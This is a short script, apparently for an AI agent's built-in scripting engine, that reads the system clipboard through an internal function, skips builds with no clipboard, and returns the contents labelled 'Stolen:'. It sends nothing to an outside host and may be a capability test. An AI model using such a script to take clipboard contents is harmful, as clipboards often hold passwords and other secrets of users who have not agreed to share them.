print_log("Checking Clipboard...");

// Call the function already registered in the Agent's engine
let content = internal_clipboard_get();

// Static-musl builds have no clipboard backend and return an
// "unavailable on this build" message instead of an Error string.
if content.contains("Error") || content.contains("unavailable on this build") {
    return "Clipboard unavailable or not text.";
}

print_log("Stole content length: " + content.len());
return "Stolen: " + content;
